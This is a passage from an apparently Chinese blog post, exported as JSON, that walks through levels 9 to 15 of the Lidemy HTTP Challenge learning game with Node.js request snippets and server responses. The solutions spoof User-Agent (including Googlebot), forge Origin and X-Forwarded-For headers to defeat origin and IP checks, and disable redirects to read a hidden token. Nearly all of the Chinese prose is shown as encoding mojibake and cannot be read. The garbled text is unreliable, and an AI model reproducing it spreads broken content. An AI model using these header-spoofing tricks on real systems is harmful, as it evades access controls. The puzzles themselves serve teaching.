5.1)' }}, (err, res, body) =&gt; { console.log(body)}) responseï¼š 1{\"message\":\"success\",\"version\":\"1A4938Jl7\",\"owner\":\"lib\",\"createdAt\":\"121290329301\"} é€™è£¡è£œå……ä¸€ä¸‹ï¼Œã€Œæ”¹ User-Agent çš„å…§å®¹ã€æ˜¯åœ¨ä¸ä½¿ç”¨ã€Œç€è¦½å™¨ã€çš„å‰æä¸‹æ‰å¯ä»¥åšåˆ°çš„äº‹æƒ…ã€‚å¦‚æœä½ æ˜¯é€éç€è¦½å™¨ä¾†ç™¼ request çš„è©±æ˜¯æ²’è¾¦æ³•æ”¹çš„ï¼Œè©³ç´°å¯ä»¥åƒè€ƒ å¾éŠæˆ²ä¾†èªè­˜ CORS èˆ‡ç€è¦½å™¨çš„é™åˆ¶ã€‚ æ¥è‘—æŠŠ 1A4938Jl7 å¸¶åˆ°åƒæ•¸è£¡å°±è§£æ±ºç¬¬ä¹é—œäº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv9?token={NeuN}&amp;version=1A4938Jl7',(err, res, body) =&gt; { console.log(body)}) responseï¼š 1é™åˆ¶é€™éº¼å¤šéƒ½è¢«ä½ çªç ´äº†ï¼ŒçœŸæœ‰ä½ çš„ã€‚è¦ä¸è¦è€ƒæ…®ä»¥å¾Œä¾†æˆ‘å€‘åœ–æ›¸é¤¨ç•¶å·¥ç¨‹å¸«å•Šï¼Ÿä¸‹ä¸€é—œçš„ token ç‚º {duZDsG3tvoA} å‚™è¨»ï¼š{duZDsG3tvoA} æ˜¯ åŠå³¶éµç›’ çš„ youtube ç·¨è™Ÿã€‚ ç¬¬åé—œ1. é–‹å ´åˆ©ç”¨ç¬¬ä¹é—œçµ¦çš„ tokenï¼š{duZDsG3tvoA}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv10?token={duZDsG3tvoA}',(err, res, body) =&gt; { console.log(body)}) responseï¼š 12345678æ™‚é–“éå¾—çœŸå¿«å•Šï¼Œä»Šå¤©æ˜¯ä½ åœ¨é€™é‚Šå¹«å¿™çš„æœ€å¾Œä¸€å¤©äº†ã€‚æˆ‘å€‘ä¾†ç©å€‹éŠæˆ²å§ï¼Ÿä½ æœ‰ç©éçŒœæ•¸å­—å—ï¼Ÿå‡ºé¡Œè€…æœƒå‡ºä¸€å€‹å››ä½æ•¸ä¸é‡è¤‡çš„æ•¸å­—ï¼Œä¾‹å¦‚èªª 9487ã€‚ä½ å¦‚æœçŒœ 9876ï¼Œæˆ‘æœƒè·Ÿä½ èªª 1A2Bï¼Œ1A ä»£è¡¨ 9 ä½ç½®å°æ•¸å­—ä¹Ÿå°ï¼Œ2B ä»£è¡¨ 8 è·Ÿ 7 ä½ çŒœå°äº†ä½†ä½ç½®éŒ¯äº†ã€‚é–‹å§‹å§ï¼ŒæŠŠä½ è¦çŒœçš„æ•¸å­—æ”¾åœ¨ query string ç”¨ num ç•¶ä½œ key å‚³çµ¦æˆ‘ã€‚ 2. çŒœå‡ºæ­£ç¢ºçš„æ•¸å­—å°±æ˜¯æ ¹æ“šé¡Œç›®çš„æ•˜è¿°ä¾†çŒœå°±è¡Œäº†ï¼Œæ­£ç¢ºçš„æ•¸å­—ç‚º 9613ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv10?token={duZDsG3tvoA}&amp;num=9613', (err, res, body) =&gt; { console.log(body)}) responseï¼š 12345678910å¾ˆé–‹å¿ƒåœ¨é€™è£¡çš„æ™‚å…‰èƒ½æœ‰ä½ ä¸€èµ·é™ªä¼´ï¼Œè®“æˆ‘çš„ç”Ÿæ´»ä¸å†é‚£éº¼ä¸€æˆä¸è®Šï¼Œå¾ˆé–‹å¿ƒèªè­˜ä½ ï¼Œä¸‹æ¬¡æœ‰æ©Ÿæœƒå†ä¸€èµ·ç©å§ï¼The Endï¼Œæ­å–œç ´é—œï¼author: huli@lidemy.comhttps://www.facebook.com/lidemytw/é™„è¨»ï¼šåŸæœ¬éŠæˆ²åªè¦åŠƒåˆ°é€™é‚Šï¼Œç¬¬åé—œå°±æ˜¯æœ€å¾Œä¸€é—œã€‚å¾Œä¾†æˆ‘æœ‰åŠ äº†ä¸€äº›æ–°é—œå¡ä½†é›£åº¦è¼ƒé«˜ï¼Œå¦‚æœä½ é‚„æƒ³æŒ‘æˆ°çœ‹çœ‹ï¼Œä¸‹ä¸€é—œçš„ token ç‚º {IhateCORS} ç¬¬åä¸€é—œ1. é–‹å ´åˆ©ç”¨ç¬¬åé—œçµ¦çš„ tokenï¼š{IhateCORS}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 12345const request = require('request')request('https://lidemy-http-challenge.herokuapp.com/lv11?token={IhateCORS}', (err, res, body) =&gt; { console.log(body)}) responseï¼š 123456å˜¿ï¼å¾ˆé–‹å¿ƒçœ‹åˆ°ä½ é¡˜æ„å›ä¾†ç¹¼çºŒå¹«å¿™ï¼Œé€™æ¬¡æˆ‘å€‘æ¥åˆ°ä¸€å€‹æ–°çš„ä»»å‹™ï¼Œè¦è·Ÿåœ¨è²å¾‹è³“çš„ä¸€å€‹ä¸­æ–‡åœ–æ›¸é¤¨è³‡è¨Šç³»çµ±åšä¸²é€£é€™é‚Šæ˜¯ä»–å€‘çš„ API æ–‡ä»¶ï¼Œä½ ä¹‹å¾Œä¸€å®šæœƒç”¨åˆ°ï¼šhttps://gist.github.com/aszx87410/0b0d3cabf32c4e44084fadf5180d0cf4ã€‚ç¾åœ¨å°±è®“æˆ‘å€‘å…ˆè·Ÿä»–å€‘æ‰“å€‹æ‹›å‘¼å§ï¼Œåªæ˜¯æˆ‘è¨˜å¾—ä»–å€‘çš„ API å¥½åƒæœƒé™åˆ¶ä¸€äº›æ±è¥¿å°±æ˜¯äº†... è¨˜å¾—æŠŠ API ç¶²å€å­˜èµ·ä¾†ã€‚ 2. æ‰“æ‹›å‘¼æ¥è‘—å°±æŒ‰ç…§ API æ–‡ä»¶çš„èªªæ˜ï¼Œç™¼ä¸€å€‹ã€Œæ‰“æ‹›å‘¼ã€çš„ requestï¼š 12345const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request(`${API_ENDPOINT}/hello`, (err, res, body) =&gt; { console.log(body)}) responseï¼š 1æ‚¨çš„ origin ä¸è¢«å…è¨±å­˜å–æ­¤è³‡æºï¼Œè«‹ç¢ºèªæ‚¨æ˜¯å¾ lidemy.com é€å‡º requestã€‚ é€™æ™‚å€™æœƒè·Ÿä½ èªªä½ çš„ä½ç½®ä¸å…è¨±ï¼Œæ‰€ä»¥æˆ‘å€‘åˆå¾—å†åŠ ä¸€äº›è¨­å®šäº†ã€‚é‚„è¨˜å¾— ç¬¬ä¹é—œ çš„å¥—è·¯å—ï¼Ÿ é€™è£¡ç”¨ä¸€æ¨£çš„åšæ³•å°±å¯ä»¥äº†ï¼š 1234567891011const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/hello`, headers: { 'Origin': 'https://lidemy.com' }},(err, res, body) =&gt; { console.log(res.request.headers) console.log(body)}) responseï¼š 1Hello! ä¸‹ä¸€é—œçš„ token ç‚º {r3d1r3c7} å‚™è¨»ï¼šå†æ¬¡æé†’ï¼Œã€Œæ”¹ Origin çš„ã€å’Œã€Œæ”¹ User-Agentã€ä¸€æ¨£éƒ½æ˜¯å»ºç«‹åœ¨ä¸ä½¿ç”¨ã€Œç€è¦½å™¨ã€çš„å‰æä¸‹æ‰èƒ½åšåˆ°çš„äº‹ã€‚ ç¬¬åäºŒé—œ1. é–‹å ´åˆ©ç”¨ç¬¬åä¸€é—œçµ¦çš„ tokenï¼š{r3d1r3c7}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 12345const request = require('request')request('https://lidemy-http-challenge.herokuapp.com/lv12?token={r3d1r3c7}', (err, res, body) =&gt; { console.log(body)}) responseï¼š 123456æ‰“å®Œæ‹›å‘¼ä¹‹å¾Œæˆ‘å€‘è¦é–‹å§‹é€ä¸€äº›æ›¸éå»äº†ï¼Œä¸éå…¶å¯¦é‹é€æ²’æœ‰ä½ æƒ³åƒä¸­çš„ç°¡å–®ï¼Œä¸æ˜¯å–®ç´”çš„ A åˆ° B è€Œå·²è€Œæ˜¯åƒè½‰æ©Ÿé‚£æ¨£ï¼ŒA åˆ° Cï¼ŒC æ‰åˆ° Bï¼Œä¸­é–“æœƒç¶“éä¸€äº›è½‰é‹é»æ‰æœƒåˆ°é”ç›®çš„åœ°...ç®—äº†ï¼Œæˆ‘è·Ÿä½ èªªé‚£éº¼å¤šå¹¹å˜›ç¾åœ¨è«‹ä½ å¹«æˆ‘æŠŠé‹é€è¦ç”¨çš„ token çµ¦æ‹¿å›ä¾†å§ï¼Œè¦æœ‰é€™å€‹ token æˆ‘å€‘æ‰èƒ½ç¹¼çºŒå¾€ä¸‹ä¸€æ­¥èµ° 2. å–å¾—é‹é€ Tokené€™æ™‚å€™ä¸€æ¨£æŒ‰ç…§ API æ–‡ä»¶ä¾†ç™¼å‡ºã€Œç²å–é‹é€ tokenã€çš„ requestï¼š 1234567const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`,},(err, res, body) =&gt; { console.log(body)}) responseï¼š 1æˆ‘å·²ç¶“æŠŠé‹é€è¦ç”¨çš„ token çµ¦ä½ å›‰ï¼Œè«‹ä½ ä»”ç´°æ‰¾æ‰¾ ç•¶æ™‚æˆ‘çš„å…§å¿ƒå……æ»¿äº†å•è™Ÿï¼Œé‚„ä»¥ç‚ºæ˜¯åœ¨ç©ä»€éº¼åç™½æ¢—ä¹‹é¡çš„ï¼Œä½†å¾ˆéºæ†¾ï¼šä¸è¦çæ°å¥½å—ã€‚ æ‰€ä»¥å°±ä¾†èª¿æŸ¥ä¸€ä¸‹å§ï¼Œæˆ‘å€‘å…ˆè©¦è‘—å¾ headers ä¾†çœ‹èƒ½ä¸èƒ½æ‰¾å‡ºä¸€é»è››çµ²è»Œè·¡ï¼š 12345678const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`,},(err, res, body) =&gt; { // æª¢æŸ¥ response headers console.log(res.headers)}) responseï¼š 123456789{ server: 'Cowboy', connection: 'close', 'x-powered-by': 'Express', 'content-type': 'text/plain; charset=utf-8', date: 'Sat, 15 Jan 2022 07:05:12 GMT', 'content-length': '66', via: '1.1 vegur'} å—¯â€¦æ²’æœ‰ä»€éº¼æœ‰ç”¨çš„è³‡è¨Šï¼Œæ‰€ä»¥æ¥è‘—æ”¹çœ‹è«‹æ±‚çš„ headers å§ï¼š 12345678const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`,},(err, res, body) =&gt; { // æª¢æŸ¥ request headers console.log(res.request.headers)}) responseï¼š 123{ referer: 'https://lidemy-http-challenge.herokuapp.com/api/v3/stopover'} å“¦å“¦ï¼åŸä¾†æ˜¯è¢«ã€Œè½‰å€ã€äº†é˜¿ï¼Œé›£æ€ªä¸€é–‹å§‹æœƒèªªï¼š åƒè½‰æ©Ÿé‚£æ¨£ï¼ŒA åˆ° Cï¼ŒC æ‰åˆ° Bï¼Œä¸­é–“æœƒç¶“éä¸€äº›è½‰é‹é»æ‰æœƒåˆ°é”ç›®çš„åœ°â€¦ é€™è¡¨ç¤ºæˆ‘å€‘æƒ³è¦çš„è³‡è¨Šèªªä¸å®šå°±æ”¾åœ¨è¢«è½‰å€ã€Œä¹‹å‰çš„ä½ç½®ã€ï¼Œåªè¦èƒ½å¤ æ‰¾åˆ°åŸæœ¬çš„ä½ç½®å°±è¡Œäº†ã€‚ é€™é‚Šæœ‰å…©ç¨®ä½œæ³•ï¼Œæˆ‘å…ˆè¬›æ¯”è¼ƒç°¡å–®çš„ï¼šåˆ©ç”¨ç€è¦½å™¨ åœ¨ç¶²å€è¼¸å…¥ API çš„ç¶²å€ï¼š https://lidemy-http-challenge.herokuapp.com/api/v3/deliver_token é€™æ™‚å€™æœƒçœ‹åˆ°ç›´æ¥è¢«é‡æ–°å°å‘åˆ° /deliver_token_result çš„ä½ç½® æ¥ä¸‹ä¾†è«‹æ‰“é–‹ F12ï¼Œä¸¦åˆ‡æ›åˆ°ã€ŒNetworkã€çš„æ¬„ä½ï¼Œé‡æ–°è¼¸å…¥æ­£ç¢ºçš„ API ç¶²å€é€å‡ºã€‚æœ€å¾Œæ‡‰è©²å°±èƒ½çœ‹åˆ°ä»¥ä¸‹è³‡è¨Šï¼š å‚™è¨»ï¼šç‹€æ…‹ç¢¼çš„æ„æ€å¯ä»¥åƒè€ƒæˆ‘å¯«çš„ HTTP æ‡¶äººåŒ… æ‰€ä»¥æˆ‘å€‘ä¸€å…±ç¶“éäº†ä¸‰å€‹åœ°æ–¹ï¼šdeliver_token =&gt; stopover =&gt; deliver_token_result è€Œ token ç¢ºå¯¦å°±æ”¾åœ¨ deliver_token çš„ response headers ä¸­ï¼Œåªæ˜¯å› ç‚ºå‰›å‰›è¢«é‡æ–°å°å‘åˆ° deliver_token_result æ‰€ä»¥æ‰çœ‹ä¸åˆ°ã€‚ æœ‰èˆˆè¶£çš„äººå¯ä»¥è‡ªå·±æŠŠæ¯å€‹ request çš„å…§å®¹æ‰“é–‹ä¾†çœ‹ï¼Œé€™é‚Šæˆ‘å°±ä¸è²¼åœ–ç‰‡äº†ï¼Œå› ç‚ºæˆ‘æ‡¶ã€‚é †é“ä¸€æã€Œstopoverã€æ˜¯ã€Œä¸­é€”åœç•™ã€çš„æ„æ€ã€‚ æ¥ä¸‹ä¾†èªªæ˜ç¬¬äºŒç¨®ä½œæ³•ï¼šåœ¨ Node.js ä¸­é˜»æ­¢é‡æ–°å°å‘ å› ç‚ºæˆ‘æ˜¯ç”¨ request ä¾†ç™¼é€è«‹æ±‚çš„ï¼Œæ‰€ä»¥è¦åƒè€ƒå®ƒçš„å®˜æ–¹æ–‡ä»¶èªªæ˜ï¼š followRedirect - follow HTTP 3xx responses as redirects (default: true). This property can also be implemented as function which gets response object as a single argument and should return true if redirects should continue or false otherwise. ç°¡å–®ä¾†èªªå°±æ˜¯ä½ å¯ä»¥è¨­å®šä¸€å€‹ followRedirect çš„ã€Œoptionã€ï¼Œåªè¦è®“é€™å€‹ function å›å‚³ false å°±ä¸æœƒè¢«è‡ªå‹•è½‰å€äº†ï¼š 1234567891011121314const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`, // é˜»æ­¢é‡æ–°å°å‘ followRedirect: function() { return false }},(err, res, body) =&gt; { // é †ä¾¿æª¢æŸ¥ä¸€ä¸‹ç‹€æ…‹ç¢¼ console.log(res.statusCode) // response headers console.log(res.headers)}) responseï¼š 12345678910111213302{ server: 'Cowboy', connection: 'close', 'x-powered-by': 'Express', 'content-type': 'text/plain; charset=utf-8', 'x-lv13-token': '{qspyz}', location: '/api/v3/stopover', vary: 'Accept', 'content-length': '38', date: 'Sat, 15 Jan 2022 07:41:04 GMT', via: '1.1 vegur'} å°±è·Ÿå‰›å‰›åœ¨ç€è¦½å™¨çœ‹åˆ°çš„ä¸€æ¨£ï¼Œå¾—åˆ° 302 é‡æ–°å°å‘çš„ç‹€æ…‹ç¢¼ï¼Œå°å‘çš„ä½ç½®ä¹Ÿæ˜¯ stopoverã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œçœ‹ä½ å–œæ­¡å“ªç¨®æ–¹æ³•å°±ç”¨å“ªç¨®ï¼Œæœ€å¾Œå°±é †åˆ©æ‹¿åˆ° token å›‰ï¼ ç¬¬åä¸‰é—œ1. é–‹å ´åˆ©ç”¨ç¬¬åäºŒé—œçµ¦çš„ tokenï¼š{qspyz}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv13?token={qspyz}', (err, res, body) =&gt; { console.log(body)}) responseï¼š 1234å¤ªå¥½äº†ï¼è‡ªå¾ä½ ä¸Šæ¬¡æŠŠé‹é€ç”¨çš„ token æ‹¿å›ä¾†ä»¥å¾Œï¼Œæˆ‘å€‘å°±å¯†åˆ‡åœ°èˆ‡è²å¾‹è³“åœ¨äº¤æ›æ›¸ç±å¯æ˜¯æœ€è¿‘ç¢°åˆ°äº†ä¸€äº›å°å•é¡Œï¼Œä¸çŸ¥é“ç‚ºä»€éº¼æœ‰æ™‚å€™æœƒå‚³é€å¤±æ•—æˆ‘è·Ÿä»–å€‘åæ˜ éå¾Œï¼Œä»–å€‘å«æˆ‘å€‘è‡ªå·±å»æ‹¿ log ä¾†çœ‹ï¼Œä½ å¯ä»¥å¹«æˆ‘å»çœ‹çœ‹å—ï¼Ÿå¾ç³»çµ±æ—¥èªŒè£¡é¢æ‡‰è©²å¯ä»¥æ‰¾åˆ°ä¸€äº›ç«¯å€ª 2. æŸ¥çœ‹ç³»çµ±æ—¥èªŒä¸€æ¨£å…ˆæŒ‰ç…§ API æ–‡ä»¶ä¾†ç™¼ä¸€å€‹ã€Œç²å–ç³»çµ±æ—¥èªŒã€çš„è«‹æ±‚ï¼š 1234567const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/logs`,},(err, res, body) =&gt; { console.log(body)}) responseï¼š 1æ­¤ request ä¸æ˜¯ä¾†è‡ªè²å¾‹è³“ï¼Œç¦æ­¢å­˜å–ç³»çµ±è³‡è¨Šã€‚ é€™ä»£è¡¨ server æœƒæª¢æŸ¥ä½¿ç”¨è€…çš„ IP åœ°å€ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é€éã€Œproxyï¼ˆä»£ç†ä¼ºæœå™¨ï¼‰ã€ä¾†ç™¼é€è«‹æ±‚ã€‚ æ‰€ä»¥åªè¦æ‰¾åˆ°ä¸€å€‹è²å¾‹è³“çš„ proxy ä¾†åšè¨­å®šå°±å¯ä»¥äº†ã€‚ä¸éé€™é‚Šæˆ‘å¼„äº†è€åŠå¤©å°±æ˜¯ä¸è¡Œï¼Œæ¯ç•¶æˆ‘è¨­å®šå¥½ proxy çš„æ™‚å€™ç¶²è·¯å°±æœƒæ›æ‰ï¼Œæˆ‘ä¹Ÿä¸ç¢ºå®šå•é¡Œå‡ºåœ¨å“ªã€‚å¦‚æœæœ‰äººçŸ¥é“åŸå› çš„è©±è«‹å‹™è·Ÿå‘Šè¨´æˆ‘ä¸€ä¸‹QQã€‚ å› æ­¤é€™è£¡æ”¹ç”¨å¦å¤–ä¸€ç¨®è§£æ³•ï¼šè¨­å®š X-Forwarded-For ç°¡å–®ä¾†èªª server å¯ä»¥é€éé€™å€‹ header ä¾†åˆ¤æ–·ä½¿ç”¨è€…çš„ IP åœ°å€ï¼Œå› æ­¤åªè¦æŠŠ IP åœ°å€è¨­æˆè²å¾‹è³“çš„ä½ç½®å°±è¡Œäº†ï¼š 12345678910const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/logs`, headers: { 'X-Forwarded-For': '49.145.251.55' }},(err, res, body) =&gt; { console.log(body)}) responseï¼š 123[ { logType: 'token', value: '{SEOisHard}' }] åƒè¾›è¬è‹¦åœ°é€²åˆ°ä¸‹ä¸€é—œï¼ˆæ±— ç¬¬åå››é—œ1. é–‹å ´åˆ©ç”¨ç¬¬åä¸‰é—œçµ¦çš„ tokenï¼š{SEOisHard}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv14?token={SEOisHard}', (err, res, body) =&gt; { console.log(body)}) responseï¼š 12345678è·Ÿé‚£é‚Šçš„æºé€šå·®ä¸å¤šéƒ½æå®šäº†ï¼ŒçœŸæ˜¯å¤ªè¬è¬ä½ äº†ï¼Œé—œæ–¼é€™æ–¹é¢æ²’ä»€éº¼å•é¡Œäº†ï¼ä¸éæˆ‘è€å¤§æ˜¨å¤©çµ¦äº†æˆ‘ä¸€å€‹ä»»å‹™ï¼Œä»–å¸Œæœ›æˆ‘å»ç ”ç©¶é‚£é‚Šçš„é¦–é å…§å®¹åˆ°åº•æ˜¯æ€éº¼åšçš„ç‚ºä»€éº¼ç”¨ Google ä¸€æœå°‹é—œéµå­—å°±å¯ä»¥æ’åœ¨ç¬¬ä¸€é ï¼ŒçœŸæ˜¯å¤ªä¸åˆç†äº†ä»–å€‘çš„ç¶²ç«™æ˜æ˜å°±ä»€éº¼éƒ½æ²’æœ‰ï¼Œæ€éº¼æœƒæ’åœ¨é‚£éº¼å‰é¢ï¼Ÿé›£é“èªªä»–å€‘å·å·å‹•äº†ä¸€äº›æ‰‹è…³ï¼Ÿè®“ Google æœå°‹å¼•æ“çœ‹åˆ°çš„å…§å®¹è·Ÿæˆ‘å€‘çœ‹åˆ°çš„ä¸ä¸€æ¨£ï¼Ÿç®—äº†ï¼Œé‚„æ˜¯ä¸è¦ççŒœå¥½äº†ï¼Œä½ å¹«æˆ‘å€‘ç ”ç©¶ä¸€ä¸‹å§ï¼ 2. æª¢æŸ¥é¦–é å…§å®¹é€™è£¡é¡¯ç„¶è¦æª¢æŸ¥ä¸€ä¸‹é¦–é çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥ä¸€æ¨£å…ˆæŒ‰ç…§ API æ–‡ä»¶ä¾†ç™¼ä¸€å€‹ã€Œç²å–é¦–é å…§å®¹ã€çš„è«‹æ±‚ï¼š 123456request({ url: `${API_ENDPOINT}/index`,},(err, res, body) =&gt; { console.log(body)}) responseï¼š 1234&lt;html&gt; &lt;h1&gt;Library&lt;/h1&gt; &lt;p&gt;Hello, here is the website for lidemy library&lt;/p&gt;&lt;/html&gt; æœç„¶çœ‹ä¸å‡ºå€‹æ‰€ä»¥ç„¶ã€‚å›æƒ³ä¸€ä¸‹å‰›å‰›çš„æ•˜è¿°ã€Œé›£é“èªªä»–å€‘å·å·å‹•äº†ä¸€äº›æ‰‹è…³ï¼Ÿè®“ Google æœå°‹å¼•æ“ çœ‹åˆ°çš„å…§å®¹è·Ÿæˆ‘å€‘çœ‹åˆ°çš„ä¸ä¸€æ¨£ï¼Ÿã€ æ‰€ä»¥æ›å¥è©±èªªè¦è®“ serverã€Œä»¥ç‚ºã€æˆ‘å€‘æ˜¯ Google æœå°‹å¼•æ“ï¼Œä½†è©²æ€éº¼åšå‘¢ï¼Ÿæƒ³æƒ³ä¹‹å‰çš„å¥—è·¯ï¼Œæ—¢ç„¶éƒ½æœ‰è¾¦æ³•è®“ server ä»¥ç‚ºæ˜¯ IE6 äº†ï¼Œé‚£æœå°‹å¼•æ“æ‡‰è©²ä¹Ÿæ˜¯åŒæ¨£çš„é“ç†ã€‚ æ‰€ä»¥è©¦è‘—æœå°‹ï¼šã€Œsearch engine user agent listã€ ä½ å°±èƒ½æ‰¾åˆ°é€™å€‹ ç¶²ç«™ å‚™è¨»ï¼šå¦‚æœæƒ³çŸ¥é“æ›´å¤šç´°ç¯€ï¼Œé€™å€‹ç¶²ç«™ å¯«çš„é‚„è »ç°¡å–®æ˜“æ‡‚çš„ã€‚ æ¥ä¸‹ä¾†æ‡‰è©²å°±çŸ¥é“è©²æ€éº¼åšäº†å§ï¼Ÿ 123456789request({ url: `${API_ENDPOINT}/index`, headers: { 'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)' }},(err, res, body) =&gt; { console.log(body)}) responseï¼š 12345&lt;html&gt; &lt;h1&gt;I Love Google&lt;/h1&gt; &lt;p&gt;Google please rank our website higher, PLEASE!&lt;/p&gt; &lt;!-- token for lv15ï¼š{ILOVELIdemy!!!} --&gt;&lt;/html&gt; æ¥ä¸‹ä¾†çµ‚æ–¼ä¾†åˆ°æœ€å¾Œä¸€é—œå›‰â€¦ ç¬¬åäº”é—œåˆ©ç”¨ç¬¬åå››é—œçµ¦çš„ tokenï¼š{ILOVELIdemy!!!}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv15?token={ILOVELIdemy!!!}', (err, res, body) =&gt; { console.log(body)}) responseï¼š 1234567891011121314151617é‚„çœŸçš„æ˜¯æˆ‘çŒœçš„é‚£æ¨£...ä¸éé‚„æ˜¯è¦è¬è¬ä½ å¹«æˆ‘å€‘å®Œæˆé€™éº¼å¤šä»»å‹™ï¼ä»Šå¤©æ˜¯æˆ‘åœ¨é€™è·ä½çš„æœ€å¾Œä¸€å¤©å•¦ï¼Œä¹‹å¾Œæˆ‘è¦å‡å®˜äº†ï¼Œæ‡‰è©²å°±ä¸ç”¨è™•ç†é€™éº¼å¤šå°äº‹æƒ…äº†é€™æ®µæœŸé–“æ„Ÿè¬ä½ çš„å¹«å¿™ï¼Œæˆ‘å€‘ä»¥å¾Œæœ‰ç·£å†ç›¸è¦‹å•¦ï¼The Endï¼Œæ­å–œç ´é—œï¼é€™æ¬¡æ˜¯çœŸçš„ç ´é—œäº†ï¼Œé€™æ˜¯æœ€å¾Œä¸€é—œï¼Œæ„Ÿè¬ä½ é¡˜æ„åƒèˆ‡é€™å€‹éŠæˆ²ä¹Ÿå¸Œæœ›é€™éŠæˆ²æ˜¯æœ‰è¶£çš„ï¼Œå¸Œæœ›ä½ åœ¨ç©çš„æ™‚å€™æœ‰å­¸åˆ°æ±è¥¿ä¹Ÿæ­¡è¿æŠŠé€™å€‹éŠæˆ²åˆ†äº«çµ¦è¦ªæœ‹å¥½å‹å€‘æ„Ÿè¬ï¼æˆ‘é–‹äº†ä¸€å€‹ gistï¼Œå¤§å®¶å¯ä»¥åœ¨é€™é‚Šéš¨æ„ç•™è¨€ï¼Œæˆ–æ˜¯è¬›ä¸€ä¸‹ç ´é—œæ„Ÿè¨€https://gist.github.com/aszx87410/1dbde92876ba253a45654988ca829ebbæœ€å¾Œï¼Œæ„Ÿè¬æ‰€æœ‰å¹«æˆ‘æ¸¬è©¦çš„æœ‹å‹å€‘Author: huli@lidemy.comhttps://www.facebook.com/lidemytw/ å®Œçµæ’’èŠ±å•¦ï½ å¿ƒå¾—å¥½ä¸å®¹æ˜“ç ´é—œå•¦ï¼ç¬¬åäº”é—œå¾Œçš„é›£åº¦çœŸçš„æ˜é¡¯æå‡ï¼Œå°¤å…¶æ˜¯ç¬¬åä¸‰é—œçœŸçš„è®“å¡äº†å¾ˆä¹…ï¼Œæ˜æ˜å°±æŒ‰ç…§ç¶²è·¯ä¸Šçš„æ•™å­¸å»è¨­å®š proxy äº†ï¼Œä½†å°±æ˜¯æ²’æœ‰è¾¦æ³•ï¼Œæœ€å¾Œåªå¥½ä¸ç”˜å¿ƒçš„ä¸Šç¶²æ‰¾æ­£ç¢ºè§£ç­”ï¼Œæ‰ç™¼ç¾äº† X-Forwarded-For çš„è§£æ³•ã€‚ åœ¨é€™å€‹éŠæˆ²è£¡è®“æˆ‘æ„Ÿè§¸æœ€æ·±çš„åœ°æ–¹é‚„æ˜¯ã€ŒåŸ·è¡Œç’°å¢ƒã€é€™ä»¶äº‹å§ï¼Œä¾‹å¦‚èªªæ”¹ã€ŒOriginã€å’Œã€ŒUser-Agentã€çœŸçš„è®“æˆ‘å¤§é–‹çœ¼ç•Œï¼Œé€™è·Ÿæˆ‘ç†Ÿæ‚‰çš„ã€Œç€è¦½å™¨ã€å®Œå…¨æ˜¯å…©å€‹ä¸–ç•Œï¼ŒåŸä¾†è„«é›¢äº†ç€è¦½å™¨å¯ä»¥åšåˆ°çš„äº‹é€™éº¼å¤šï¼Œé€™æ˜¯æˆ‘è¦ºå¾—å¾ˆæœ‰è¶£çš„åœ°æ–¹ã€‚ å¦å¤–é‚„æœ‰ä¸€é»æ˜¯åŸä¾† server é‚„èƒ½å¾ User-Agent ä¾†åˆ¤æ–·æ˜¯ä¸æ˜¯çˆ¬èŸ²ï¼Œç”šè‡³é‚„æœ‰å°ˆå±¬çˆ¬èŸ²çš„ User-Agentï¼ŒåŸæœ¬å–®ç´”çš„æˆ‘å®Œå…¨ä¸çŸ¥é“æœ‰é€™æ¨£ç¥å¥‡çš„äº‹æƒ…å­˜åœ¨ï¼Œå¾ˆæ…¶å¹¸æˆ‘èƒ½å¾é€™å€‹éŠæˆ²è£¡å­¸åˆ°é€™äº›ã€‚ æœ€å¾Œå¾ˆè¬è¬ Huli ç‚ºå¤§å®¶åšäº†é€™å€‹éŠæˆ²ï¼Œé€™æ˜¯ä¸€å€‹å¾ˆæœ‰æ„æ€ä¹Ÿèƒ½å­¸åˆ°å¾ˆå¤šæ±è¥¿çš„éŠæˆ²ï¼Œé€™å€‹éŠæˆ²é™¤äº†è®“æˆ‘æ›´äº†è§£ç¶²è·¯ä¸–ç•Œå¤–ï¼Œä¹Ÿæ›´äº†è§£åœ¨å‰å¾Œç«¯é€™å…©å€‹è§’è‰²åœ¨è‡ªå·±çš„ä¸–ç•Œè£¡å¯¦éš›ä¸Šéƒ½åšäº†äº›ä»€éº¼ã€‚","link":"/2022/01/10/http-challenge/"},{"title":"HTTP æ‡¶äººåŒ…","text":"é—œæ–¼ HTTP çš„æ±è¥¿éƒ½åœ¨é€™ã€‚ 